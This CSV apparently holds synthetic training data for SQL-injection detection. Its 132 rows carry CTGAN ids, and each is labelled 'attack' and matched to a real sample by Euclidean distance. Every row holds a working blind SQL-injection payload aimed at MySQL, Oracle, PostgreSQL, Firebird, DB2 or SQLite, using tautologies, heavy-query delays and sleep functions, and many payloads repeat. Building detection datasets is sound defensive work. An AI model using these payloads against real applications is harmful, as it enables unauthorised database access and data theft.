id,label,payload_type,payload,retrieval_method,retrieval_source_id,retrieval_distance
CTGAN_000011,attack,boolean,"1""  )   and make_set  (  4553  =  8132,8132  )   and   (  ""pfci"" like ""pfci",nearest_attack_euclidean,R000726,4.3877690282867805
CTGAN_000012,attack,boolean,"1""   )    )    as qrok where 8257  =  8257 or 8421  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   --",nearest_attack_euclidean,R000628,7.201394781068747
CTGAN_000013,attack,boolean,"1   )    )     )   or 2367  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )  --",nearest_attack_euclidean,R000410,5.808878432238527
CTGAN_000014,attack,boolean,1'+  (  select nsri where 1202  =  1202 and 4595  =  4595#,nearest_attack_euclidean,R000768,8.030801952131855
CTGAN_000015,attack,boolean,"1'   )    )     )   and 3580  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  --",nearest_attack_euclidean,R000597,6.350530061184037
CTGAN_000016,attack,boolean,"1'   )    )     )   or 7552  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )   and    (    (     (  'nqam'  =  'nqam",nearest_attack_euclidean,R000513,7.508228798709463
CTGAN_000017,attack,boolean,"1'   )    )     )   and 3707  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )   and    (    (     (  'viad' like 'viad",nearest_attack_euclidean,R000651,4.695995136287775
CTGAN_000018,attack,boolean,"1%'   )    )     )   and 8189  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )  --",nearest_attack_euclidean,R000609,6.142049615060618
CTGAN_000019,attack,boolean,"1""  )   and 7533  =  7533 and   (  ""jfsw"" like ""jfsw",nearest_attack_euclidean,R000431,5.552075049759242
CTGAN_000020,attack,boolean,"1  )   and 6414  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )  ",nearest_attack_euclidean,R000075,6.007014837848784
CTGAN_000021,attack,boolean,-3834'   )    )    as hhiy where 2086  =  2086 or 3038  =  3038,nearest_attack_euclidean,R000070,5.413262804320571
CTGAN_000022,attack,boolean,"-4327"" or make_set  (  3107  =  1781,1781  )   and ""lclf"" like ""lclf",nearest_attack_euclidean,R000441,5.518557752130157
CTGAN_000023,attack,boolean,"1""   )    )     )   or 8315  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )   and    (    (     (  ""gimc"" like ""gimc",nearest_attack_euclidean,R000096,6.406455572152147
CTGAN_000024,attack,boolean,"1""  )   rlike   (  select   (  case when   (  7689  =  7689  )   then 1 else 0x28 end   )    )    and   (  ""kxws"" like ""kxws",nearest_attack_euclidean,R000619,6.096025850415078
CTGAN_000025,attack,boolean,"1' in boolean mode  )   or 8315  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )  #",nearest_attack_euclidean,R000389,7.790666017400976
CTGAN_000026,attack,boolean,"1""  )   as lipa where 3450  =  3450 and make_set  (  8403  =  8403,8899  )  --",nearest_attack_euclidean,R000687,4.265835057204323
CTGAN_000027,attack,boolean,"-8429'   )    )     )   or make_set  (  9354  =  9354,7185  )   and    (    (     (  'bwih' like 'bwih",nearest_attack_euclidean,R000156,5.29674031639702
CTGAN_000028,attack,boolean,"1   )    )    and 8514  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )   and    (    (   5507  =  5507",nearest_attack_euclidean,R000580,5.250220395037273
CTGAN_000029,attack,boolean,"1%'   )    )     )   and 8514  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )   and    (    (     (  '%'  =  '",nearest_attack_euclidean,R000731,7.222712299592335
CTGAN_000030,attack,boolean,"1  )   and 8407  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   ",nearest_attack_euclidean,R000228,6.280470666850547
CTGAN_000031,attack,boolean,"1   )    )     )   or 2367  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )  --",nearest_attack_euclidean,R000410,5.689675176157499
CTGAN_000032,attack,boolean,"-8429'   )    )     )   or make_set  (  9354  =  9354,7185  )   and    (    (     (  'bwih' like 'bwih",nearest_attack_euclidean,R000156,4.858984170475265
CTGAN_000033,attack,boolean,"1'  )   and 8407  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   ",nearest_attack_euclidean,R000649,6.972423056322241
CTGAN_000034,attack,boolean,"1'   )    )     )   and 3580  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  --",nearest_attack_euclidean,R000597,6.100050667779662
CTGAN_000035,attack,boolean,1   )    )    and 6240  =    (  'qqpjq'||  (  select case 6240 when 6240 then 1 else 0 end from rdb$database  )  ||'qzvzq'  )   and    (    (   6406  =  6406,nearest_attack_euclidean,R000058,4.871891467742078
CTGAN_000036,attack,boolean,1'+  (  select enzd where 6046  =  6046 and   (  3020  =  3020  )  *6703  )  +',nearest_attack_euclidean,R000299,6.25358259005247
CTGAN_000037,attack,boolean,1' and   (  1088  =  7530  )  *7530 and 'xkfu'  =  'xkfu,nearest_attack_euclidean,R000555,3.772090331820467
CTGAN_000038,attack,boolean,"select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3 and    (    (     (  ""ekbq""  =  ""ekbq",nearest_attack_euclidean,R000489,4.646244898044052
CTGAN_000039,attack,boolean,"1   )    )    and 8514  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )   and    (    (   5507  =  5507",nearest_attack_euclidean,R000580,6.1377197599099915
CTGAN_000040,attack,boolean,"1%""  )   and make_set  (  9956  =  1060,1060  )   and   (  ""%""  =  """,nearest_attack_euclidean,R000400,5.261606936105571
CTGAN_000041,attack,boolean,"-4319""  )   where 7534  =  7534 or 8246  =  3217",nearest_attack_euclidean,R000583,5.200586312773297
CTGAN_000042,attack,boolean,"1""   )    )     )   or 9643  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )   and    (    (     (  ""nthu"" like ""nthu",nearest_attack_euclidean,R000402,5.063647013941058
CTGAN_000043,attack,boolean,"1'  )   where 2775  =  2775 or 2633  =  dbms_pipe.receive_message  (  chr  (  112  )  ||chr  (  65  )  ||chr  (  65  )  ||chr  (  103  )  ,5  )  --",nearest_attack_euclidean,R000335,5.761163373989361
CTGAN_000044,attack,boolean,"1 and make_set  (  8403  =  8403,8899  )  -- rbxf",nearest_attack_euclidean,R000483,5.48900314829353
CTGAN_000045,attack,boolean,"1'  )   and 8407  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   ",nearest_attack_euclidean,R000649,5.778890852855287
CTGAN_000046,attack,boolean,"-6496""   )    )     )   or 1471  =  5278 and    (    (     (  ""zkoj""  =  ""zkoj",nearest_attack_euclidean,R000327,6.8972035339045
CTGAN_000047,attack,boolean,"1  )   and 3202  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )    and   (  7182  =  7182",nearest_attack_euclidean,R000698,5.443580065207077
CTGAN_000048,attack,boolean,"1' in boolean mode  )   and elt  (  4249  =  4249,7259  )  #",nearest_attack_euclidean,R000204,4.863819566151709
CTGAN_000049,attack,boolean,"1' in boolean mode  )   or 8315  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )  #",nearest_attack_euclidean,R000389,7.762979834563781
CTGAN_000050,attack,boolean,"1   )    )    and 8514  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )   and    (    (   5507  =  5507",nearest_attack_euclidean,R000580,5.00941369468049
CTGAN_000051,attack,boolean,"-8060""  )   where 5290  =  5290 or 5903  =    (  'qqpjq'||  (  select case 5903 when 5903 then 1 else 0 end from rdb$database  )  ||'qzvzq'  )  --",nearest_attack_euclidean,R000305,5.282968771358018
CTGAN_000052,attack,boolean,"1""   )    )    or 8421  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )    and    (    (   ""ubxw"" like ""ubxw",nearest_attack_euclidean,R000247,6.338941932356958
CTGAN_000053,attack,boolean,"-7731""   )    )    or make_set  (  2551  =  4389,4389  )   and    (    (   ""unly"" like ""unly",nearest_attack_euclidean,R000255,5.391601746372442
CTGAN_000054,attack,boolean,"1'  )   and make_set  (  4551  =  6487,6487  )   and   (  'jnqa'  =  'jnqa",nearest_attack_euclidean,R000279,4.985622324036158
CTGAN_000055,attack,boolean,"1  )   or 7552  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )   and   (  5468  =  5468",nearest_attack_euclidean,R000107,3.585187580850708
CTGAN_000056,attack,boolean,"1' in boolean mode  )   and 8514  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  #",nearest_attack_euclidean,R000412,6.8138707881932845
CTGAN_000057,attack,boolean,"1%'   )    )     )   and 8189  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )  --",nearest_attack_euclidean,R000609,6.327335273625027
CTGAN_000058,attack,boolean,"1%'  )   and 8635  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   --",nearest_attack_euclidean,R000680,4.3545461071233325
CTGAN_000059,attack,boolean,"1""  )   rlike   (  select   (  case when   (  7689  =  7689  )   then 1 else 0x28 end   )    )    and   (  ""kxws"" like ""kxws",nearest_attack_euclidean,R000619,6.3703849052503685
CTGAN_000060,attack,boolean,"1"" where 4082  =  4082 and elt  (  5699  =  1432,1432  )  --",nearest_attack_euclidean,R000459,4.659403138243221
CTGAN_000061,attack,boolean,"-1305  )   or make_set  (  2298  =  5545,5545  )   and   (  6715  =  6715",nearest_attack_euclidean,R000214,5.974737584664791
CTGAN_000062,attack,boolean,"1""  )   as jask where 7629  =  7629 or 2633  =  dbms_pipe.receive_message  (  chr  (  112  )  ||chr  (  65  )  ||chr  (  65  )  ||chr  (  103  )  ,5  )  --",nearest_attack_euclidean,R000430,6.191082005328977
CTGAN_000063,attack,boolean,"1"" where 4082  =  4082 and elt  (  5699  =  1432,1432  )  --",nearest_attack_euclidean,R000459,6.356208300561996
CTGAN_000064,attack,boolean,"1""   )    )     )   or 9643  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )   and    (    (     (  ""jzsb""  =  ""jzsb",nearest_attack_euclidean,R000100,4.892874607861467
CTGAN_000065,attack,boolean,1'   )    )    as cyom where 2318  =  2318 and 7533  =  7533--,nearest_attack_euclidean,R000553,6.830871225262768
CTGAN_000066,attack,boolean,"1'||  (  select 'scba' where 9079  =  9079 and 8635  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   --",nearest_attack_euclidean,R000485,4.6355141245171
CTGAN_000067,attack,boolean,"1   )    )    as cbdx where 8998  =  8998 and elt  (  4249  =  4249,7259  )  --",nearest_attack_euclidean,R000209,5.025129433915017
CTGAN_000068,attack,boolean,"1""   )    )     )   or 9643  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )   and    (    (     (  ""jzsb""  =  ""jzsb",nearest_attack_euclidean,R000100,6.682972019778463
CTGAN_000069,attack,boolean,"1"" where 3018  =  3018 or 2633  =  dbms_pipe.receive_message  (  chr  (  112  )  ||chr  (  65  )  ||chr  (  65  )  ||chr  (  103  )  ,5  )  --",nearest_attack_euclidean,R000664,8.383162017603178
CTGAN_000070,attack,boolean,-4873'   )    )     )   or 3038  =  3038,nearest_attack_euclidean,R000499,5.809490377389639
CTGAN_000071,attack,boolean,1   )    )    and 6240  =    (  'qqpjq'||  (  select case 6240 when 6240 then 1 else 0 end from rdb$database  )  ||'qzvzq'  )   and    (    (   6406  =  6406,nearest_attack_euclidean,R000058,6.899153267105734
CTGAN_000072,attack,boolean,"select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 and    (    (     (  ""dskh""  =  ""dskh",nearest_attack_euclidean,R000766,7.820384655243591
CTGAN_000073,attack,boolean,"select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3 and    (    (     (  'squj'  =  'squj",nearest_attack_euclidean,R000638,6.556569546451538
CTGAN_000074,attack,boolean,"1%""   )    )    and char  (  120  )  ||char  (  106  )  ||char  (  117  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  9981  )  ,0  )  ,5000000000  )  ,null  )   and    (    (   ""%""  =  """,nearest_attack_euclidean,R000776,7.2322210503170865
CTGAN_000075,attack,boolean,"1' and make_set  (  3445  =  5963,5963  )   and 'wjfw'  =  'wjfw",nearest_attack_euclidean,R000094,4.822580982829343
CTGAN_000076,attack,boolean,"-8429'   )    )     )   or make_set  (  9354  =  9354,7185  )   and    (    (     (  'bwih' like 'bwih",nearest_attack_euclidean,R000156,5.609995953375613
CTGAN_000077,attack,boolean,"1""  )   rlike   (  select   (  case when   (  7689  =  7689  )   then 1 else 0x28 end   )    )    and   (  ""kxws"" like ""kxws",nearest_attack_euclidean,R000619,5.187961798181699
CTGAN_000078,attack,boolean,"1' and make_set  (  8403  =  8403,8899  )   and 'fttd' like 'fttd",nearest_attack_euclidean,R000347,6.532019799567482
CTGAN_000079,attack,boolean,"1""   )    )    as qrok where 8257  =  8257 or 8421  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   --",nearest_attack_euclidean,R000628,6.236975706253009
CTGAN_000080,attack,boolean,"1   )    )     )   or 7417  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )  --",nearest_attack_euclidean,R000358,5.8447251716467346
CTGAN_000081,attack,boolean,"1%"" and 6537  =  dbms_pipe.receive_message  (  chr  (  76  )  ||chr  (  116  )  ||chr  (  117  )  ||chr  (  65  )  ,5  )   and ""%""  =  """,nearest_attack_euclidean,R000424,6.758863721839755
CTGAN_000082,attack,boolean,"-6496""   )    )     )   or 1471  =  5278 and    (    (     (  ""zkoj""  =  ""zkoj",nearest_attack_euclidean,R000327,6.9693459816471295
CTGAN_000083,attack,boolean,"1'  )   or 8156  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   --",nearest_attack_euclidean,R000612,5.431075963600357
CTGAN_000084,attack,boolean,"1%""  )   or 4915  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  --",nearest_attack_euclidean,R000141,4.789801592338327
CTGAN_000085,attack,boolean,"1""   )    )     )   and make_set  (  8403  =  8403,8899  )   and    (    (     (  ""czvm"" like ""czvm",nearest_attack_euclidean,R000207,6.200350504575151
CTGAN_000086,attack,boolean,"1' or 7552  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )  ",nearest_attack_euclidean,R000217,6.536292151590523
CTGAN_000087,attack,boolean,"-1064' or make_set  (  6439  =  2937,2937  )   and 'qojd'  =  'qojd",nearest_attack_euclidean,R000059,6.412242751641411
CTGAN_000088,attack,boolean,"1'+  (  select 'qzcx' where 9524  =  9524 and elt  (  3069  =  8430,8430   )    )   +'",nearest_attack_euclidean,R000363,6.159294263019708
CTGAN_000089,attack,boolean,"1'  )   and 9660  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )  --",nearest_attack_euclidean,R000132,6.861965144777846
CTGAN_000090,attack,boolean,1'+  (  select enzd where 6046  =  6046 and   (  3020  =  3020  )  *6703  )  +',nearest_attack_euclidean,R000299,5.064682736271836
CTGAN_000091,attack,boolean,"1   )    )     )   or 2367  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )  --",nearest_attack_euclidean,R000410,5.636590431680932
CTGAN_000092,attack,boolean,"1""  )   rlike   (  select   (  case when   (  7689  =  7689  )   then 1 else 0x28 end   )    )    and   (  ""kxws"" like ""kxws",nearest_attack_euclidean,R000619,4.964442305283607
CTGAN_000093,attack,boolean,"1""  )   rlike   (  select   (  case when   (  8732  =  6244  )   then 1 else 0x28 end   )    )    and   (  ""unuk""  =  ""unuk",nearest_attack_euclidean,R000355,5.044082766129787
CTGAN_000094,attack,boolean,"1""  )   where 2180  =  2180 and make_set  (  8403  =  8403,8899  )  --",nearest_attack_euclidean,R000297,7.280815312109627
CTGAN_000095,attack,boolean,"1' in boolean mode  )   and 8514  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  #",nearest_attack_euclidean,R000412,7.284367523206526
CTGAN_000096,attack,boolean,"1""   )    )    and 3580  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  --",nearest_attack_euclidean,R000304,5.972040655683154
CTGAN_000097,attack,boolean,"1%""  )   or 4915  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  --",nearest_attack_euclidean,R000141,6.516319052474202
CTGAN_000098,attack,boolean,"select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 and    (    (   ""%""  =  """,nearest_attack_euclidean,R000153,6.09918651846767
CTGAN_000099,attack,boolean,"1""   )    )    and 3580  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  --",nearest_attack_euclidean,R000304,6.000247991847104
CTGAN_000100,attack,boolean,"1   )    )     )   or 5286  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )   and    (    (     (  1164  =  1164",nearest_attack_euclidean,R000369,5.57939818958959
CTGAN_000101,attack,boolean,-3339' or 8571  =  8571--,nearest_attack_euclidean,R000386,6.678917016937094
CTGAN_000102,attack,boolean,"-5630""  )   or 3038  =  3038",nearest_attack_euclidean,R000466,6.734873507234277
CTGAN_000103,attack,boolean,"1  )   and 3202  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )    and   (  7182  =  7182",nearest_attack_euclidean,R000698,7.335889758642366
CTGAN_000104,attack,boolean,"1'  )   and elt  (  4249  =  4249,7259  )  ",nearest_attack_euclidean,R000147,6.854377347730871
CTGAN_000105,attack,boolean,"1 where 2267  =  2267 and 6537  =  dbms_pipe.receive_message  (  chr  (  76  )  ||chr  (  116  )  ||chr  (  117  )  ||chr  (  65  )  ,5  )  --",nearest_attack_euclidean,R000302,5.410815452971838
CTGAN_000106,attack,boolean,"1'   )    )     )   and 3580  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  --",nearest_attack_euclidean,R000597,6.165746056373818
CTGAN_000107,attack,boolean,"1   )    )     )   or 2367  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )  --",nearest_attack_euclidean,R000410,6.38153037130368
CTGAN_000108,attack,boolean,-5995'   )    )    or 6872  =  6872 and    (    (   'pywh'  =  'pywh,nearest_attack_euclidean,R000338,5.1735402080640505
CTGAN_000109,attack,boolean,"1"" where 1618  =  1618 or 8156  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   --",nearest_attack_euclidean,R000756,6.720083599949208
CTGAN_000110,attack,boolean,"1'   )    )    and elt  (  3053  =  9778,9778  )   and    (    (   'yfaa' like 'yfaa",nearest_attack_euclidean,R000364,4.534039964362047
CTGAN_000111,attack,boolean,1'+  (  select bfeq where 3445  =  3445 and 9198  =  9198--,nearest_attack_euclidean,R000746,5.579488289200272
CTGAN_000112,attack,boolean,"1   )    )    and 8514  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )   and    (    (   5507  =  5507",nearest_attack_euclidean,R000580,5.789331218780121
CTGAN_000113,attack,boolean,"1""   )    )     )   or 9643  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )   and    (    (     (  ""jzsb""  =  ""jzsb",nearest_attack_euclidean,R000100,6.2740749954556
CTGAN_000114,attack,boolean,"1 and make_set  (  6911  =  1867,1867  )  ",nearest_attack_euclidean,R000602,5.866412442049969
CTGAN_000115,attack,boolean,"-5840'  )   or elt  (  1032  =  1032,3623  )  ",nearest_attack_euclidean,R000692,7.452844004718019
CTGAN_000116,attack,boolean,"1"" and 3707  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )   and ""hvwv""  =  ""hvwv",nearest_attack_euclidean,R000448,5.1914677781816225
CTGAN_000117,attack,boolean,"1""   )    )    and make_set  (  8403  =  8403,8899  )   and    (    (   ""nsyl""  =  ""nsyl",nearest_attack_euclidean,R000465,4.386745604945946
CTGAN_000118,attack,boolean,"1""   )    )     )   and 6414  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )   and    (    (     (  ""cwpt"" like ""cwpt",nearest_attack_euclidean,R000572,8.181406034077916
CTGAN_000119,attack,boolean,"-8673""  )   or make_set  (  9354  =  9354,7185  )   and   (  ""edap"" like ""edap",nearest_attack_euclidean,R000474,4.95500232619552
CTGAN_000120,attack,boolean,"1'   )    )    or 7552  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )   and    (    (   'cdaq' like 'cdaq",nearest_attack_euclidean,R000252,5.005464971156172
CTGAN_000121,attack,boolean,"1'  )   as afnt where 4719  =  4719 and elt  (  8224  =  1275,1275  )  --",nearest_attack_euclidean,R000376,6.397574539557186
CTGAN_000122,attack,boolean,"1  )   or 7552  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )   and   (  5468  =  5468",nearest_attack_euclidean,R000107,5.893085498193634
CTGAN_000123,attack,boolean,"-1305  )   or make_set  (  2298  =  5545,5545  )   and   (  6715  =  6715",nearest_attack_euclidean,R000214,6.529351052171059
CTGAN_000124,attack,boolean,"-8429'   )    )     )   or make_set  (  9354  =  9354,7185  )   and    (    (     (  'bwih' like 'bwih",nearest_attack_euclidean,R000156,4.439290643937505
CTGAN_000125,attack,boolean,"1 or 5286  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )  ",nearest_attack_euclidean,R000270,5.925405888952199
CTGAN_000126,attack,boolean,"1 or 2633  =  dbms_pipe.receive_message  (  chr  (  112  )  ||chr  (  65  )  ||chr  (  65  )  ||chr  (  103  )  ,5  )  -- pvdw",nearest_attack_euclidean,R000222,4.368003624283786
CTGAN_000127,attack,boolean,"1%' or 8421  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )    and '%'  =  '",nearest_attack_euclidean,R000432,5.048129695583068
CTGAN_000128,attack,boolean,"1'  )   and 8407  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   ",nearest_attack_euclidean,R000649,5.55762739586517
CTGAN_000129,attack,boolean,1'+  (  select enzd where 6046  =  6046 and   (  3020  =  3020  )  *6703  )  +',nearest_attack_euclidean,R000299,7.38312143583256
CTGAN_000130,attack,boolean,"1""   )    )     )   and char  (  120  )  ||char  (  106  )  ||char  (  117  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  9981  )  ,0  )  ,5000000000  )  ,null  )   and    (    (     (  ""uqyb""  =  ""uqyb",nearest_attack_euclidean,R000741,6.106760364466285
CTGAN_000131,attack,boolean,"1  )   as adzj where 5575  =  5575 or 8421  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   --",nearest_attack_euclidean,R000360,3.872430150498995
CTGAN_000132,attack,boolean,1'||  (  select 'xdzp' from dual where 5786  =  5786 and   (  3020  =  3020  )  *6703  )  ||',nearest_attack_euclidean,R000254,6.335761284989999
CTGAN_000133,attack,boolean,1' and 7533  =  7533 and 'frvk'  =  'frvk,nearest_attack_euclidean,R000201,5.532052699604991
CTGAN_000134,attack,boolean,"1'  )   as kgnd where 1550  =  1550 and 3202  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )   --",nearest_attack_euclidean,R000180,5.6410460206427135
CTGAN_000135,attack,boolean,1'+  (  select enzd where 6046  =  6046 and   (  3020  =  3020  )  *6703  )  +',nearest_attack_euclidean,R000299,6.2764059435736925
CTGAN_000136,attack,boolean,"1'  )   and 8407  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   ",nearest_attack_euclidean,R000649,6.504231795519822
CTGAN_000137,attack,boolean,"1   )    )    and 8514  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )   and    (    (   5507  =  5507",nearest_attack_euclidean,R000580,5.3271305351265745
CTGAN_000138,attack,boolean,1 where 5828  =  5828 and   (  3020  =  3020  )  *6703--,nearest_attack_euclidean,R000453,4.244505414312818
CTGAN_000139,attack,boolean,"1%""   )    )    and 8514  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )   and    (    (   ""%""  =  """,nearest_attack_euclidean,R000121,7.650688362576343
CTGAN_000140,attack,boolean,"-2149""   )    )     )   or elt  (  1032  =  1032,3623  )   and    (    (     (  ""hoon"" like ""hoon",nearest_attack_euclidean,R000743,5.127978661495036
CTGAN_000141,attack,boolean,"select count  (  *  )   from generate_series  (  1,5000000  )   and   (  ""kngx"" like ""kngx",nearest_attack_euclidean,R000613,4.726919072344904
CTGAN_000142,attack,boolean,"1"" where 1618  =  1618 or 8156  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   --",nearest_attack_euclidean,R000756,7.234173204988319
